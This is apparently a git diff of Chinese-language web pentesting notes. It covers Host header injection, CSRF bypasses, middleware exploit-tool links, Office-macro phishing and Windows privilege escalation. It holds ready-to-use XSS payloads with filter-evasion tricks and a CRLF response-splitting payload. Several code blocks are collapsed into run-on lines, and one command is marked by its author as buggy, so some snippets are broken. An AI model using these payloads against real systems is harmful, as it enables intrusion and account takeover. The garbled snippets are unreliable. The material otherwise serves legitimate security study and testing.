+以下是可用于利用各种污点流漏洞的典型来源：
+
+document.URL
+document.documentURI
+document.URLUnencoded
+document.baseURI
+location
+document.cookie
+document.referrer
+window.name
+history.pushState
+history.replaceState
+localStorage
+sessionStorage
+IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
+Database
+
+以下类型的数据也可用作利用 taint-flow 漏洞的来源：
+
+> 反射数据
+> 存储数据  
+> 网络消息  
+
+### 如何防止基于 DOM 的污点流漏洞
+
+您无法采取任何单一措施来完全消除基于 DOM 的攻击的威胁。但是，一般来说，避免基于 DOM 的漏洞的最有效方法是避免允许来自任何不受信任来源的数据动态更改传输到任何接收器的值。
+
+如果应用程序所需的功能意味着这种行为是不可避免的，则必须在客户端代码中实现防御。在许多情况下，可以在白名单的基础上验证相关数据，只允许已知安全的内容。在其他情况下，需要清理或编码数据。这可能是一项复杂的任务，并且根据要插入数据的上下文，可能涉及按适当顺序组合使用 JavaScript 转义、HTML 编码和 URL 编码。
+
+有关您可以采取的防止特定漏洞的措施，请参阅上表中链接的相应漏洞页面。
+
+### DOM 破坏
+
+DOM clobbering 是一种高级技术，您可以在其中将 HTML 注入页面以操作 DOM 并最终更改网站上 JavaScript 的行为。DOM 破坏的最常见形式是使用锚元素覆盖全局变量，然后应用程序以不安全的方式使用该变量，例如生成动态脚本 URL。
+
 ## HTTP 主机头攻击
+
 ### 什么是 HTTP 主机标头？
+
 从 HTTP/1.1 开始，HTTP Host 标头是强制性的请求标头。它指定客户端要访问的域名。例如，当用户访问 时https://portswigger.net/web-security，他们的浏览器将编写一个包含 Host 标头的请求，如下所示：
 
 GET /web-security HTTP/1.1
 Host: portswigger.net
 
 在某些情况下，例如当请求已由中间系统转发时，Host 值可能会在它到达预期的后端组件之前被更改。我们将在下面更详细地讨论这种情况。
+
 ### HTTP Host 标头的目的是什么？
+
 HTTP Host 标头的目的是帮助识别客户端想要与之通信的后端组件。如果请求不包含 Host 标头，或者 Host 标头以某种方式格式错误，这可能会导致将传入请求路由到预期应用程序时出现问题。
 
 从历史上看，这种歧义并不存在，因为每个 IP 地址只会托管单个域的内容。如今，主要是由于基于云的解决方案和外包大部分相关架构的不断增长的趋势，多个网站和应用程序可以在同一个 IP 地址上访问是很常见的。这种方法也越来越流行，部分原因是 IPv4 地址耗尽。
@@ -3826,6 +4035,7 @@ HTTP Host 标头的目的是帮助识别客户端想要与之通信的后端组�
 当多个应用程序可通过同一 IP 地址访问时，这通常是以下情况之一的结果。
 
 #### 虚拟主机
+
 一种可能的情况是单个 Web 服务器托管多个网站或应用程序。这可能是一个所有者的多个网站，但也可以将拥有不同所有者的网站托管在一个共享平台上。这不像以前那么常见，但仍然会出现在一些基于云的 SaaS 解决方案中。
 
 在任何一种情况下，虽然这些不同的网站中的每一个都有不同的域名，但它们都与服务器共享一个公共 IP 地址。在单个服务器上以这种方式托管的网站被称为“虚拟主机”。
@@ -3833,15 +4043,19 @@ HTTP Host 标头的目的是帮助识别客户端想要与之通信的后端组�
 对于访问网站的普通用户来说，虚拟主机通常与托管在其自己的专用服务器上的网站无法区分。
 
 #### 通过中介路由流量
+
 另一种常见情况是网站托管在不同的后端服务器上，但客户端和服务器之间的所有流量都通过中间系统路由。这可能是一个简单的负载平衡器或某种反向代理服务器。这种设置在客户端通过内容交付网络 (CDN) 访问网站的情况下尤为普遍。
 
 在这种情况下，即使网站托管在单独的后端服务器上，它们的所有域名也解析为中间组件的单个 IP 地址。这带来了一些与虚拟主机相同的挑战，因为反向代理或负载平衡器需要知道它应该将每个请求路由到的适当后端。
 
 #### HTTP Host 头是如何解决这个问题的？
+
 在这两种情况下，都依赖 Host 标头来指定预期的收件人。一个常见的类比是给住在公寓楼的人寄一封信的过程。整栋建筑都有相同的街道地址，但在这个街道地址后面有许多不同的公寓，每个公寓都需要以某种方式接收正确的邮件。解决此问题的一种方法是简单地在地址中包含公寓号或收件人姓名。在 HTTP 消息的情况下，Host 头用于类似的目的。
 
 当浏览器发送请求时，目标 URL 将解析为特定服务器的 IP 地址。当此服务器收到请求时，它会参考 Host 标头来确定预期的后端并相应地转发请求。
+
 ### 什么是 HTTP 主机标头攻击？
+
 HTTP Host 标头攻击利用易受攻击的网站，这些网站以不安全的方式处理 Host 标头的值。如果服务器隐式信任 Host 标头，并且未能正确验证或转义它，则攻击者可能能够使用此输入注入操纵服务器端行为的有害负载。涉及将有效负载直接注入主机标头的攻击通常称为“主机标头注入”攻击。
 
 除非在安装过程中在配置文件中手动指定，否则现成的 Web 应用程序通常不知道它们部署在哪个域上。当他们需要知道当前域时，例如，要生成包含在电子邮件中的绝对 URL，他们可能会求助于从 Host 标头中检索域：
@@ -3856,20 +4070,24 @@ HTTP Host 标头攻击利用易受攻击的网站，这些网站以不安全的�
 * 特定功能中的 业务逻辑缺陷
 * 基于路由的SSRF
 * 经典的服务器端漏洞，例如 SQL 注入
+
 ### HTTP 主机头漏洞是如何产生的？
+
 HTTP Host 标头漏洞通常是由于用户无法控制标头的错误假设而出现的。这会在 Host 标头中创建隐式信任并导致验证不充分或对其值进行转义，即使攻击者可以使用 Burp Proxy 等工具轻松修改它。
 
 即使 Host 标头本身被更安全地处理，根据处理传入请求的服务器的配置，Host 可能会通过注入其他标头而被覆盖。有时网站所有者不知道默认情况下支持这些标头，因此，它们可能不会受到相同级别的审查。
 
 事实上，许多这些漏洞的出现并不是因为不安全的编码，而是因为相关基础设施中一个或多个组件的不安全配置。之所以会出现这些配置问题，是因为网站将第三方技术集成到其架构中，而不必了解配置选项及其安全含义。
+
 ### 如何验证http主机头漏洞？
+
 通过修改 Host 标头，利用burp发送请求看是否到达目标应用程序。具体
 step1: 将Host 标头修改成任意的、无法识别的域名时观察会发生什么。（返回指定网站存在http主机头漏洞）
 sep2：step1更大可能返回的结果是报Invalid Host header。可能是因为以下中原因导致的：
+
 * 网站存在CDN,CDN无法识别解析
 * 某些网站会验证 Host 标头是否与来自 TLS 握手的 SNI 匹配
-* 
- 这时候需要继续验证：
+* 这时候需要继续验证：
  * 某些解析算法会从 Host 标头中省略端口，这意味着仅验证域名。如果您还能够提供非数字端口，则可以保持域名不变以确保到达目标应用程序，同时可能通过端口注入有效负载，类似于：
 
 GET /example HTTP/1.1
@@ -3896,6 +4114,7 @@ GET /example HTTP/1.1
 Host: vulnerable-website.com
 Host: bad-stuff-here
 假设前端优先于标头的第一个实例，但后端更喜欢最后一个实例。在这种情况下，您可以使用第一个标头来确保您的请求被路由到预期目标，并使用第二个标头将您的有效负载传递到服务器端代码中。
+
 ### 如何防止HTTP Host头攻击
 
 如何防止HTTP Host头攻击
@@ -3917,6 +4136,7 @@ Host: bad-stuff-here
 
 小心使用仅限内部的虚拟主机
 使用虚拟主机时，您应该避免在与面向公众的内容相同的服务器上托管仅供内部使用的网站和应用程序。否则，攻击者可能能够通过主机头操作访问内部域。
+
 ## xss攻击
 
 
@@ -3940,33 +4160,28 @@ phpinfo展示界面中拥有cookie值，你获取到这个之后可以访问网�
 
 **知名靶场**
 [xss-lab](https://github.com/rebo-rn/xss-lab)与[答案](https://www.cnblogs.com/wangyuyang1016/p/13532898.html#_caption_3)
+
 ### 基础使用
 
-```bash
+```python
 # 常规payload，一般一个测试注入点会每条都尝试
-<script>alert(1)</script>
+<script>alert('1')</script>
 <b onmouseover=alert(1)>Click Me!</b>
-<svg onload=alert(1)><body onload="alert('XSS')">
-<img src="ddksah" onerror=alert(1);> # 
-' onclick='alert(1) # INPUT可以加onclick属性值
-"> <a href="javascript:alert(1)">sfdst</a>
-
-# 一些实用性高的payload 
-<a href="javascript&#58;alert('\<%E6%B5%8B%E8%AF%95\>')">jump</a> #參考https://segmentfault.com/a/1190000019980090
-
-
-# 绕过（通常一句XSS代码会同时结合以下策略）
-浏览器进行绘制时，解码顺序分别为 HTML > URL > JS；使用html编码 https://tool.oschina.net/encode/
-大小写混写
-多个关键字
-如果被过滤了空格则用%0a
-
-
-# 需闭合
-这是一般执行输出框中插入XSS语句，而url参数通常不用；
-# 以下代码展示了输入框的常见写法
-<input name="t_sort" value="" type="">
-
+<svg onload=alert(1)><body onload="alert('XSS')"><img src="ddksah" onerror=alert(1);> # ' onclick='alert(1) # INPUT可以加onclick属性值"> <a href="javascript:alert(1)">sfdst</a>
+# 一些实用性高的payload
+ <a href="javascript&#58;alert('\<%E6%B5%8B%E8%AF%95\>')">jump</a> 
+#參考https://segmentfault.com/a/1190000019980090
+# 绕过（通常一句XSS代码会同时结合以下策略）浏览器进行绘制时，解码顺序分别为 HTML > URL > JS；
+使用html编码 https://tool.oschina.net/encode/
+用优先级运算绕过如+alert(1)+或-alert(1)-或in alert(1) in大小写混写多个关键字如果被过滤了空格则用%0a
+# 过滤了 ’，“，<,> 没有过滤引号 
+' οnclick=alert(/xss/) 
+'javascript:alert(/xss/)
+# 过滤引号
+无法闭合第一个引号:反斜杠转义回去/宽字节（GBK等编码格式）
+第二个引号：注释符号<!--或//
+# 需闭合这是一般执行输出框中插入XSS语句，而url参数通常不用；
+# 以下代码展示了输入框的常见写法<input name="t_sort" value="" type="">
 ```
 
 
@@ -4069,6 +4284,7 @@ beef还是很强大的，入侵成功后可以对对方页面进行跳转或者�
 首先需要寻找可注入的参数，以免你的输入被直接过滤掉了。比如通过查看网页的返回你将能找到某个可注入的参数，xss可能出现在任何地方比如你的ip被回显到界面，比如page参数通常也会回显到界面
 
 #### 防御
+
 特殊字符过滤
 特殊字符转义
 长度限制
@@ -4097,20 +4313,27 @@ https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
 http://www.jsfuck.com/
 
 ## 跨站请求伪造 (CSRF）
+
 ### 什么是CSRF？
+
 跨站请求伪造（也称为 CSRF）是一种 Web 安全漏洞，允许攻击者诱使用户执行他们不打算执行的操作。它允许攻击者部分规避旨在防止不同网站相互干扰的同源策略。
 
 ###  CSRF 攻击的影响是什么？
+
 只要受害者在登录状态，点击了一下你的恶意链接，或者你在网页中内嵌了渲染代码(恶意网站的链接可以包含有效的HTML， <imgsrc=”www.malicious_site.com”>  ，并且并不需要 受害者点击链接)也可以完成攻击。
 
 CSRF通常可以用来以目标用户的名义发邮件、盗取目标用户账号、购买商品。通常用来做蠕虫攻击、刷SEO流量等。
+
 ### CSRF 攻击前提是什么？
+
 要使 CSRF 攻击成为可能，必须具备三个关键条件：
 
 * 一个相关的动作。应用程序中存在攻击者有理由诱导的操作。这最好是特权（否则是普通操作即便存在csrf也没什么意义）操作（例如选择可以添加用户删除、修改等操作上）或对用户特定数据的任何操作（例如更改用户自己的密码）。
 * 基于 Cookie 的会话处理。执行该操作涉及发出一个或多个 HTTP 请求，应用程序仅依赖会话 cookie 来识别发出请求的用户。没有其他机制来跟踪会话或验证用户请求。
 * 没有不可预测的请求参数。执行操作的请求不包含攻击者无法确定或猜测其值的任何参数。例如，当导致用户更改其密码时，如果攻击者需要知道现有密码的值，该函数就不容易受到攻击。
+
 ### 如何构建CSRF攻击？
+
 **检测是否存在csrf漏洞**
 修改csrf,repeater包，如果存在4XX状态码说明此修改不合适或不存在csrf漏洞
 如果302跳转说明存在攻击
@@ -4128,32 +4351,27 @@ CSRF通常可以用来以目标用户的名义发邮件、盗取目标用户账�
 * 
 
 ```bash
-Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
-
-csrf=WfF1szMUHhiokx9AHFply5L2xAOfjRkE&email=wiener@normal-user.com
-# 隐藏值在使用 POST 方法提交的 HTML 表单的隐藏字段内将令牌传输到客户端
-<input type="hidden" name="csrf-token" value="CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz" />
+Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLmcsrf=WfF1szMUHhiokx9AHFply5L2xAOfjRkE&email=wiener@normal-user.com# 隐藏值在使用 POST 方法提交的 HTML 表单的隐藏字段内将令牌传输到客户端<input type="hidden" name="csrf-token" value="CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz" />
 ```
 
 * 检验referer来源，请求时判断请求连接是否为当前管理员正在使用的页面(管理员在编辑文章，黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败)
 * samesite cookie防御
 
 ```bash
-# SameSite=Strict 时浏览器将不会在源自其他站点的任何请求中包含 cookie
-# 这是最具防御性的选项，但它会损害用户体验，因为如果登录用户通过第三方链接访问某个站点，那么他们将显示为未登录，并且需要在此之前重新登录以正常方式与网站互动。
-Set-Cookie: SessionId=sYMnfCUrAlmqVVZn9dqevxyFpKZt30NN; SameSite=Strict;
-# SameSite=Lax 时浏览器会将 cookie 包含在源自另一个站点的请求中，但前提是满足两个条件：
-# 该请求使用 GET 方法。使用其他方法（例如 POST）的请求将不包含 cookie。【大部分csrf都是post请求所以可以防范、许多应用程序和框架都可以容忍不同的 HTTP 方法。在这种情况下，即使应用程序本身设计使用 POST 方法，它实际上也会接受切换为使用 GET 方法的请求。】
-# 该请求由用户的顶级导航（例如单击链接）产生。其他请求，例如由脚本发起的请求，将不包含 cookie。
-Set-Cookie: SessionId=sYMnfCUrAlmqVVZn9dqevxyFpKZt30NN; SameSite=Lax;
+# SameSite=Strict 时浏览器将不会在源自其他站点的任何请求中包含 cookie# 这是最具防御性的选项，但它会损害用户体验，因为如果登录用户通过第三方链接访问某个站点，那么他们将显示为未登录，并且需要在此之前重新登录以正常方式与网站互动。Set-Cookie: SessionId=sYMnfCUrAlmqVVZn9dqevxyFpKZt30NN; SameSite=Strict;# SameSite=Lax 时浏览器会将 cookie 包含在源自另一个站点的请求中，但前提是满足两个条件：# 该请求使用 GET 方法。使用其他方法（例如 POST）的请求将不包含 cookie。【大部分csrf都是post请求所以可以防范、许多应用程序和框架都可以容忍不同的 HTTP 方法。在这种情况下，即使应用程序本身设计使用 POST 方法，它实际上也会接受切换为使用 GET 方法的请求。】# 该请求由用户的顶级导航（例如单击链接）产生。其他请求，例如由脚本发起的请求，将不包含 cookie。Set-Cookie: SessionId=sYMnfCUrAlmqVVZn9dqevxyFpKZt30NN; SameSite=Lax;
 ```
+
 ### CSRF 反防御方式有哪些？
+
 **CSRF TOKEN配置错误**
+
 * csrf token值置空
 * csrf token整个参数置空（不仅仅是它的值）
 * 更改请求方式POST改为GET，GET改为POST
 * 两个登录账户，复用一个csrf token（csrf是一次性的但与session未绑定会导致此错误）
+
 ## 模板注入
+
 模板引擎是允许开发者或设计师在创建动态网页的时候，从数据展示中分离编程逻辑的工具，模板引擎由于其模块化和简洁的代码与标准 HTML 相比而被更频繁地使用。模板注入是指用户输入直接传递到渲染模板，允许修改底层模板
 
 ## SSRF
@@ -4242,8 +4460,12 @@ autoSubTakeover
 ### HTTP劫持
 
 ### DLL劫持
+
 ## 攻击漏洞技巧
+
 ### CRLF 注入
+HTTP响应拆分漏洞，也叫CRLF注入攻击。CR、LF分别对应回车（%0d）、换行（%0a）字符。HTTP头由很多被CRLF组合分离的行构成，每行的结构都是“键：值”。如果用户输入的值部分注入了CRLF字符，它有可能改变的HTTP报头结构。
+一般在源码中存在将你请求的数据设置为数据包一部分、又不过滤情况就存在此漏洞。更多请看https://zhuanlan.zhihu.com/p/140702316
 
 **简介**
 难度：低
@@ -4518,7 +4740,9 @@ BT：扫描字典不能有敏感文件如bak等，这就要用文件上传绕过
 # 经验积累
 
 ## 漏洞出现在？
+
 挖漏洞关键：跳出思维框架
+
 ### URL参数
 
 #### 经验
@@ -4545,13 +4769,20 @@ url?error=你想打印在屏幕话# 知道参数会传递将参数补充危险�
 ```bash
 %0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20te\xt/html%0d%0aContent-Length:%2019%0d%0a%0d%0a<script>alert(dshdjs)</script>
 ```
+
 #### +xss
+
 检查参数是否接受JS代码
+
 #### +开放重定向
+
 检查参数是否接受外部链接
 常见关键词 redirect_to=  ， domain_name=  ， checkout_url= 
+
 ### 嵌入网站元素
+
 #### +xss
+
 ### 数据包参数
 
 #### 置空
@@ -4561,6 +4792,7 @@ url?error=你想打印在屏幕话# 知道参数会传递将参数补充危险�
 ```
 
 #### 修改信号
+
 ```bash
 你会注意到有个 <iframe>  标签包含 PIN 参数。这个参数实际上就是你的账户 ID。下面，如果你编辑了 HTML，并且插入了另一个 PIN，站点就会自动在新账户上执行操作
 ```
@@ -4569,7 +4801,9 @@ url?error=你想打印在屏幕话# 知道参数会传递将参数补充危险�
 
 重放
 竞态
+
 ### 文件上传
+
 #### +xxe
 
 ## 中间件
@@ -4589,13 +4823,93 @@ IIS是只适用于windows的中间件
 PROPFIND 栈溢出漏洞
 RCE CVE-2017-7269
 PUT任意文件写入
+### JAVAWEB
+                (1) Springboot：
+
+                       github上一份整理得比较好的SpringBoot的checklist：https://github.com/LandGrey/SpringBootVulExploit
+
+                       其他链接：
+
+                               https://blog.gdssecurity.com/labs/2018/4/18/jolokia-vulnerabilities-rce-xss.html
+
+                               https://www.veracode.com/blog/research/exploiting-spring-boot-actuators
+
+                               https://github.com/mpgn/Spring-Boot-Actuator-Exploit
+
+                       关于springboot引入devtools时的特定条件下的反序列化漏洞利用，可参考：https://xz.aliyun.com/t/8349 
+
+                 (2) JBoss：
+
+                            https://github.com/joaomatosf/jexboss
+
+                 (3) struts2：
+
+                           https://github.com/HatBoy/Struts2-Scan
+
+                           K8哥哥写的struts2图形化利用工具：其个人网站：http://k8gege.org/p/72f1fea6.html
+
+                 (4) Tomcat：
+
+                           https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
+
+                 (5) ThinkPHP：
+
+                           https://github.com/admintony/thinkPHPBatchPoc.git
+
+                 (6) PHP-FPM
+
+                          https://github.com/neex/phuip-fpizdam
+
+                 (7) solr
+
+                       https://github.com/Imanfeng/Apache-Solr-RCE
+Weblogic系列漏洞：弱口令 && 后台getshell、SSRF漏洞、反序列化RCE漏洞
+
+Jboss系列漏洞：未授权访问Getshell、反序列化RCE漏洞
+
+Tomcat系列漏洞：弱口令&&后台getshell、Tomcat PUT方法任意写文件漏洞
+
+Websphere系列漏洞：弱口令&&后台getshell、XXE漏洞、远程代码执行漏洞
+
+Coldfusion系列漏洞：文件读取漏洞、反序列化RCE漏洞
+
+GlassFish系列漏洞：弱口令&&后台getshell、任意文件读取漏洞
+
+Resin系列漏洞：弱口令&&后台getshell、任意文件读取漏洞
+
+Redis系列漏洞：未授权访问getshell、主从复制RCE
+
+ActiveMQ系列漏洞：ActiveMQ任意文件写入漏洞、ActiveMQ反序列化漏洞
+
+Kafka系列漏洞：未授权访问漏洞、反序列化漏洞
+
+Elasticsearch系列漏洞：命令执行漏洞、写入webshell漏洞
+
+ZooKeeper系列漏洞：未授权访问漏洞框
 
 ### Apache
 
+ Solr系列漏洞
+
+　　XML实体注入漏洞、文件读取与SSRF漏洞、远程命令执行漏洞
+　　Jackson系列漏洞
+
+　　反序列化RCE漏洞
+Dubbo 系列漏洞
+
+　　Dubbo 反序列化漏洞、Dubbo 远程代码执行漏洞
+
+
 ### Nginx
-
+### Shiro
+　　Shiro 默认密钥致命令执行漏洞、Shiro rememberMe 反序列化漏洞（Shiro-550）
+　　Shiro Padding Oracle Attack（Shiro-721）
 ### tomcat
+### struct2
+漏洞扫描工具 https://github.com/HatBoy/Struts2-Scan
 
+S2-001到S2-061漏洞
+安全公告：https://cwiki.apache.org/confluence/display/WW/Security+Bulletins
 ## 组件
 
 
@@ -4708,38 +5022,6 @@ import_request_variables()函数就是把GET、POST、COOKIE的参数注册成�
 ### JAVAWEB
 
 更多请查看《攻击javaweb应用》
-
-
-
-#### JSON WEB TOKEN
-
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714150644539.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714181545725.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-
-JWT产生在数据包中的数据验证里比如cookie中某参数。
-一般你看到的就是加密后的JWT文件，如下：
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714163343807.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-JWT分为头部(header)，声明(claims)，签名(signature)，三个部分以英文句号隔开。头部和声明会采用base64加密，签名加密与头部和声明都有关，还要进行整体的sha加密才可以得到最终值，加密方式如下图，对此的解密要用密匙才能解开。如果你还是困惑我表达的意思，你可以访问 https://jwt.io/ 输入一段JWT来交互加解密。
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714180644797.png)
-
-JWT攻击取决于对方服务器是接收数据来进行什么样的下一步操作，如果是身份验证那么你就可以做到越权，如果是取数据与SQL语句拼接，那么你就可以做到SQL注入...
-
-#####  破解
-
-**对方服务器允许签名为空**
-将头部解密之后值改为none（改为none即不要密钥的意思），在进行编码成base64，声明值看你是否需要修改相应参数来确定是否修改，（一般会修改用户名和身份过期时间的时间戳），删除签名。如果你是GET请求的数据包你在修改时应充分考虑base64特殊字符 + = / 与url编码兼容问题。常见的base64传输的=应该删掉
-
-**爆破密匙**
-爆破方法是将常用字典一个个当做秘钥，每个秘钥对应着不同的签名，将生成的签名与真实签名进行比较
-
-1、服务端根据用户登录状态，将用户信息加密到token中，返给客户端
-2、客户端收到服务端返回的token，存储在cookie中
-3、客户端和服务端每次通信都带上token，可以放在http请求头信息中，如：Authorization字段里面
-4、服务端解密token，验证内容，完成相应逻辑
-
-
-
-   JWT进行破解，对令牌数据进行破解
 
 
 
@@ -4873,6 +5155,9 @@ git clone https://www.github.com/landgrey/pydictor.gitcd pydictor/python pydicto
 ### fuzzy
 
 国外fuzzy字典https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content
+# API漏洞
+# 微信小程序漏洞
+反编译方法https://www.cnblogs.com/xiaozi/p/15003105.html
 
 # APP漏洞
 
@@ -4942,6 +5227,8 @@ https://www.freenom.com/zh/index.html?lang=zh
 ###### 常见混淆方法
 
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/673d8a87adbf4bc7b56b104c8748446f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
+或者用拉丁英文字母
 
 ###### 购买SEO高的域名
 
@@ -5060,10 +5347,14 @@ gophish自带web面板，对于邮件编辑、网站克隆、数据可视化、�
 DLL劫持
 假冒加固工具
 木马捆绑
+
 #### 链接存放在
+
 ##### +开放重定向
+
 如果网站有开放重定向只需要将重定向参数修改为外部站点。
 如果用户访问 url?参数=example.com  ，它会重定向到 http://example.com/admin，这时候这种未经验证的参数的跳转网站你就可以伪造一个网站专门用来接待受害者
+
 #### 宏 – Office
 
 虽然是很老旧，但向受害者发送恶意的 Microsoft Office 文件仍然是久经考验的一种社会工程学攻击方法。那为什么 Office 文件非常适合作为恶意 payload 的载体呢？这是因为 Office 文件的默认设置是支持 VBA 代码所以允许 VBA 代码的代码执行。尽管最近这种方法已经很容易被杀毒软件检测到，但在经过混淆处理之后，在很多情况下仍然可以生效。
@@ -5207,7 +5498,9 @@ http://cnseur/frumphp
 以下方法已经快被淘汰
 X-remote-IP:是远端IP，默认来自tcp连接客户端的Ip。可以说，它最准确，无法修改，只会得到直接连服务器客户端IP。如果对方通过代理服务器上网，就发现。获取到的是代理服务器IP了。
 HTTP_CLIENT_IP 在高级匿名代理中，这个代表了代理服务器IP。
-HTTP_X_FORWARDED_FOR = clientip,proxy1,proxy2其中的值通过一个 逗号+空格 把多个IP地址区分开, 最左边(client1)是最原始客户端的IP地址, 代理服务器每成功收到一个请求，就把请求来源IP地址添加到右边。可以传入任意格式IP.这样结果会带来2大问题，其一，如果你设置某个页面，做IP限制。 对方可以容易修改IP不断请求该页面。 其二，这类数据你如果直接使用，将带来SQL注册，跨站攻击等漏洞
+HTTP_X_FORWARDED_FOR = clientip,proxy1,proxy2其中的值通过一个 逗号+空格 把多个IP地址区分开, 最左边(client1)是最原始客户端的IP地址, 代理服务器每成功收到一个请求，就把请求来源IP地址添加到右边。可以传入任意格式IP.这样结果会带来2大问题，其一，如果你设置某个页面，做IP限制。 对方可以容易修改IP不断请求该页面。 其二，这类数据你如果直接使用，将带来SQL注册，跨站攻击等漏洞;
+
+自动化工具：burpsuite插件，只是改了一些请求头参数https://github.com/TheKingOfDuck/burpFakeIP
 **TOR**
 类似于分布式的 VPN。太慢了！！等你用成一个黄花菜都凉了
 
@@ -5880,8 +6173,7 @@ windows权限分为四种，由低到高的权限分别是user，administrator�
 常见的公开漏洞要自己收集，具体怎么搜集后续我补充
 
 ```bash
-# 写错了！！有bug。。
-systeminfo > windows.txt|(for %i in (KB5003537 KB2160329 等常见的公开漏洞)do @find /i "%i">null||@echo %i bug here! )
+# 写错了！！有bug。。systeminfo > windows.txt|(for %i in (KB5003537 KB2160329 等常见的公开漏洞)do @find /i "%i">null||@echo %i bug here! )
 ```
 
 或者你直接对输出的systeminfo利用kali 将提取任何给定的 Windows 主机的所有补丁安装历史记录。我们可以拿回这个输出结果，将其复制到我们的 Kali 系统并运行 Windows Exploit Suggester 以查找已知的漏洞然后针对性的进行漏洞利用从而提升权限。
